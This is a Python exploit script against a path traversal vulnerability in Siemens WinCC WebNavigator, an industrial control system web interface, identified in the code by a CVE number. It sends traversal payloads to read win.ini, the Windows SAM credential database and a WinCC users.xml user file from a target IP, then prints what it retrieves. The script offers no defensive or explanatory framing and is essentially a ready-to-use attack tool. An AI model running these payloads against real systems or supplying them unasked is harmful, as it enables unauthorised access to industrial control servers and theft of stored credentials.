def wincc_path_traversal(target_ip):
    """
    Path traversal vulnerability in WinCC WebNavigator
    Allows reading arbitrary files from server
    CVE-2016-9158
    """
    import requests

    # Vulnerable URL pattern
    base_url = f"http://{target_ip}/webnavigator/"

    # Path traversal to read system files
    payloads = [
        "../../../../../../../windows/win.ini",
        "../../../../../../../windows/system32/config/sam",
        "../../../Siemens/WinCC/Aplib/ProgramData/users.xml"
    ]

    for payload in payloads:
        url = base_url + payload

        try:
            response = requests.get(url, timeout=5)

            if response.status_code == 200:
                print(f"[+] Successfully read: {payload}")
                print(response.text[:200])
        except Exception as e:
            print(f"[-] Failed: {e}")

# wincc_path_traversal('192.168.1.100')
